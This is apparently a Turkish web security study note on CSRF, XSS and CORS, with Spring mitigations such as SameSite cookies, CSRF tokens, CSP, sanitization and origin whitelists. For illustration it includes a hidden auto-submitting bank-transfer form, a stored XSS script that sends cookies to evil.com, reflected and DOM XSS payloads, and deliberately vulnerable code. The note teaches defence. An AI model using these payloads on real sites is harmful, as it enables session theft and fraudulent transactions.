# 09b — CSRF, XSS ve CORS

## CSRF (Cross-Site Request Forgery)

### Ne?
Kullanıcı siteye giriş yapmış durumdayken, kötü amaçlı başka bir site, o kullanıcı adına istekte bulunur. Tarayıcı cookie'leri otomatik gönderir.

### Nasıl Saldırı?

```
Senaryo:
  1. Kullanıcı mybank.com'a giriş yaptı → session cookie var
  2. evil.com'u açtı → sayfada gizli form:

  <form action="https://mybank.com/transfer" method="POST">
    <input name="to" value="hacker-account">
    <input name="amount" value="10000">
  </form>
  <script>document.forms[0].submit();</script>

  3. Tarayıcı → POST mybank.com/transfer + cookie
  4. Bank: "cookie geçerli → işlemi yaptım" → para transfer!

Neden çalışıyor?
  Cookie'ler same-site request'lerde tarayıcı tarafından otomatik eklenir.
  Server cookie'yi görünce kullanıcıyı "authenticated" sayar.
```

### Önleme Yöntemleri

#### Yöntem 1: SameSite Cookie (En Basit)

```
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

SameSite=Strict:
  Cookie sadece aynı site'den gelen isteklerde gönderilir
  evil.com → mybank.com POST → cookie gönderilmez → işlem başarısız

SameSite=Lax (daha yaygın):
  GET isteklerine cross-site cookie gönderir (link tıklama)
  POST, PUT, DELETE → cross-site → cookie gönderilmez
  Çoğu use case için Lax yeterli

SameSite=None; Secure:
  Her zaman gönder (3rd party cookie için — ödeme entegrasyonu gibi)
  Sadece HTTPS ile çalışır
```

#### Yöntem 2: CSRF Token (Double Submit Cookie)

```java
// Spring Security default CSRF protection
@Configuration
public class SecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // JavaScript'in cookie'yi okuyabilmesi için HttpOnly=false
            );
        return http.build();
    }
}

// HTML form'da:
// Spring otomatik ekler: <input type="hidden" name="_csrf" value="...">

// AJAX için:
// 1. Cookie'den X-XSRF-TOKEN değerini oku (JavaScript erişebilir)
// 2. Header olarak gönder
// axios.defaults.headers.common['X-XSRF-TOKEN'] = getCookie('XSRF-TOKEN');
```

```
Nasıl çalışır:
  Server → response'a CSRF token koy (cookie veya form hidden field)
  Client → sonraki istekte bu token'ı hem cookie'de hem header'da gönder
  Server → ikisini karşılaştır → eşleşirse valid

  evil.com neden başaramaz?
  SOP (Same-Origin Policy): evil.com, mybank.com'un cookie'sini okuyamaz
  Token'ı okuyamazsa → token'ı header'a ekleyemez → request reddedilir
```

#### Yöntem 3: Custom Request Header

```
AJAX isteklerinde custom header ekle:
  X-Requested-With: XMLHttpRequest

Browser cross-site form submit → header ekleyemez
Browser AJAX cross-site → simple headers dışında header ekleyemez
  (CORS preflight devreye girer → server izin vermezse bloklanır)

Bu yöntem: CORS ile birlikte çalışır
```

#### Ne Zaman CSRF Token Gerekmez?

```
REST API + JWT Bearer Token:
  Authorization: Bearer eyJhbc...

  Cookie kullanılmıyor → CSRF imkansız
  Tarayıcı Bearer token'ı otomatik eklemez
  evil.com JS → SOP → başka site'nin token'ına erişemez

  Yani: JWT + Authorization header = CSRF önlemi gerekmez
```

---

## XSS (Cross-Site Scripting)

### Ne?
Uygulama, kullanıcı girdisini sanitize etmeden HTML'e yazar → saldırgan JavaScript enjekte eder → kurbanın tarayıcısında çalışır.

### 3 Türü

#### Stored XSS (Kalıcı)

```
Saldırı:
  Yorum bölümüne yaz: <script>fetch('evil.com?c='+document.cookie)</script>
  DB'ye kaydedilir → her görüntüleyen için script çalışır
  Cookie çalınır → session hijacking

Hedefler:
  Forum, yorum, profil ismi, ürün açıklaması, log viewer, admin panel
```

#### Reflected XSS (Yansıtılmış)

```
Saldırı URL: https://mysite.com/search?q=<script>alert(document.cookie)</script>
Server: "Arama sonucu: " + req.getParam("q") → HTML'e yazar
Kurban linke tıklarsa → script çalışır

Hedefler:
  Arama kutusu, hata mesajları, URL'den alınan her şey
```

#### DOM-based XSS

```javascript
// Tehlikeli kod — DOM'a doğrudan kullanıcı girdisi yazma
document.getElementById('result').innerHTML = 
    new URLSearchParams(window.location.search).get('query');

// URL: /page?query=<img src=x onerror=stealCookie()>
// innerHTML → script çalışır

// Güvenli alternatif:
document.getElementById('result').textContent = query; // escape eder
```

### Önleme

#### 1. Output Encoding

```java
// Thymeleaf otomatik escape eder:
<p th:text="${userInput}">   ← güvenli (textContent gibi davranır)
<p th:utext="${userInput}">  ← TEHLİKELİ (raw HTML yazar)

// Java'da manuel escape:
import org.springframework.web.util.HtmlUtils;
String safe = HtmlUtils.htmlEscape(userInput);

// JavaScript context'te farklı escape gerekir:
// JSON.stringify, encodeURIComponent — context'e göre değişir
```

#### 2. Content Security Policy (CSP)

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  frame-ancestors 'none';

Nasıl korur?
  Inline script: <script>evil()</script> → CSP engeller
  Harici script: <script src="evil.com/x.js"> → allowlist'te değil → engel
  
'nonce' ile inline script izni:
  CSP header: script-src 'nonce-abc123'
  HTML: <script nonce="abc123">legitCode()</script>
  Saldırgan nonce değerini bilemez → inline çalışmaz
```

#### 3. HTML Sanitization (Kullanıcı HTML içeriğine izin veriliyorsa)

```java
// OWASP Java HTML Sanitizer
PolicyFactory policy = Sanitizers.FORMATTING
    .and(Sanitizers.LINKS)
    .and(Sanitizers.IMAGES);

String safeHtml = policy.sanitize(userProvidedHtml);
// <script> → kaldırılır
// <b>, <i>, <a href> → izin verilir
// onerror, onload → kaldırılır
```

#### 4. HttpOnly Cookie

```
Set-Cookie: sessionId=abc; HttpOnly; Secure

HttpOnly: JavaScript document.cookie erişemez
XSS çalışsa bile → cookie çalamaz
Sadece HTTP request'lerde gönderilir
```

---

## CORS (Cross-Origin Resource Sharing)

### Ne?
Tarayıcının Same-Origin Policy'sini aşmak için sunucunun "başka domain'den request'lere izin veriyorum" demesi.

### SOP (Same-Origin Policy) Nedir?

```
Origin = protokol + domain + port
  https://app.com:443  → tek bir origin

SOP: JavaScript, farklı origin'e istek atabilir ama response'u okuyamaz.
  fetch("https://api.mybank.com/data")  // atabilir
  response.json()  // okuyamaz (SOP engeller)!

API: "Ben güvenilir, this domain'e izin veriyorum" → CORS header
```

### CORS Akışı

```
Simple Request (GET/POST + form content types):
  Client → GET api.example.com
  Server → Access-Control-Allow-Origin: https://app.example.com
  Tarayıcı: "Evet, app.example.com için izin var" → response'u okut

Preflight Request (PUT/DELETE veya custom header):
  Client → OPTIONS api.example.com
  Client header: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
  
  Server → 200 OK
  Server header:
    Access-Control-Allow-Origin: https://app.example.com
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
    Access-Control-Allow-Headers: Authorization, Content-Type
    Access-Control-Max-Age: 3600  (preflight cache süresi)
  
  Client: izin var → asıl request'i gönder
```

### Spring CORS Konfigürasyonu

```java
@Configuration
public class CorsConfig {

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();

        // DOĞRU: spesifik origin'ler
        config.setAllowedOrigins(List.of(
            "https://app.mycompany.com",
            "https://admin.mycompany.com"
        ));

        // DEV ortamı için (production'da KULLANMA)
        // config.addAllowedOrigin("*");

        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Request-ID"));
        config.setAllowCredentials(true);  // Cookie ve auth header için
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

### Güvenli CORS Konfigürasyonu Kuralları

```
YANLIŞ:
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true
  → * ile credentials birlikte kullanılamaz (tarayıcı engeller)
  → Ama bazı senaryolarda hâlâ tehlikeli

YANLIŞ:
  Tüm origin'lere izin ver:
  if (origin != null) addHeader("Access-Control-Allow-Origin", origin);
  → CORS bypass! Her domain izinli

DOĞRU:
  Whitelist: izin verilen domain'leri listede kontrol et
  Set<String> ALLOWED = Set.of("https://app.myco.com", "https://admin.myco.com");
  if (ALLOWED.contains(origin)) response.addHeader("ACAO", origin);

DOĞRU:
  Wildcard subdomain: *.mycompany.com
  → Regex ile kontrol et: pattern.matcher(origin).matches()
  → Dikkat: *.mycompany.com.evil.com → regex dikkatli yazılmalı!
```

### Trade-off Özeti

| Konu | Yöntem | Avantaj | Dezavantaj |
|------|--------|---------|------------|
| CSRF | SameSite=Strict | En basit | Bazı 3rd party senaryolar kırılır |
| CSRF | CSRF Token | Güvenilir | Stateless API'de karmaşık |
| CSRF | JWT Bearer | CSRF yok | Cookie-based session yok |
| XSS | Output encoding | Framework desteği | Her context farklı encode |
| XSS | CSP header | Derinlemesine savunma | Legacy sistemlerle çatışabilir |
| XSS | HTML Sanitizer | Zengin içeriğe izin verir | Yanlış policy → bypass |
| CORS | Strict whitelist | Güvenli | Yeni domain her zaman eklenmeli |
| CORS | Wildcard (*) | Kolay | Credentials ile kullanılamaz |
